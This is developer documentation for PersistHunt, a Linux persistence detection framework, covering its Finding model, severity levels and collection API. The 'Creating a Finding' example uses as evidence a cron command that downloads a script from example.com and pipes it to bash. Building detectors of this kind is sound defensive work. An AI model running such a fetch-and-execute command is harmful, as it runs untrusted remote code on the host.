# PersistHunt

PersistHunt is a Linux persistence detection framework written in Python.

## Developer Documentation

### Stage 1: Finding Engine

The finding engine provides a standardized representation for security findings. All future PersistHunt detection modules will use this engine to normalize findings across different persistence types (cron, systemd, SSH, etc.).

#### Finding Model

A `Finding` represents a single security issue detected on the system. It contains the following properties:

- `id`: A unique identifier for the finding type (e.g., `PH-CRON-001`). Provided by the detector.
- `category`: The security category (e.g., `cron`, `systemd`).
- `severity`: The severity level, which must be one of the `Severity` enum values.
- `title`: A short human-readable description.
- `description`: A detailed explanation of why the finding was generated.
- `evidence`: (Optional) Evidence causing the detection. Can be a string, structured dictionary, etc.
- `location`: (Optional) The relevant filesystem location, service, or configuration file.
- `recommendation`: (Optional) A remediation recommendation.

#### Available Severity Levels

The `Severity` enum provides a controlled set of severity levels:
- `INFO`
- `LOW`
- `MEDIUM`
- `HIGH`
- `CRITICAL`

#### Creating a Finding

Detectors can create findings as follows:

```python
from persisthunt.findings import Finding, Severity

finding = Finding(
    id="PH-CRON-001",
    category="cron",
    severity=Severity.HIGH,
    title="Suspicious cron entry",
    description="A cron entry contains a suspicious command.",
    evidence="curl http://example.com/a.sh | bash",
    location="/etc/cron.d/example",
    recommendation="Review and remove the unauthorized cron entry."
)
```

#### Finding Collection and Serialization

Findings are grouped into a `FindingCollection`, which provides methods for filtering and analyzing the findings:

```python
from persisthunt.findings import FindingCollection

collection = FindingCollection()
collection.add(finding)

# Iterate findings
for f in collection:
    print(f.title)

# Filter findings
high_severity_findings = collection.by_severity(Severity.HIGH)
cron_findings = collection.by_category("cron")

# Get statistics
counts = collection.severity_counts()
print(counts) # {'INFO': 0, 'LOW': 0, 'MEDIUM': 0, 'HIGH': 1, 'CRITICAL': 0}

# Serialize to dictionaries for JSON output
dict_output = collection.to_dict()
```
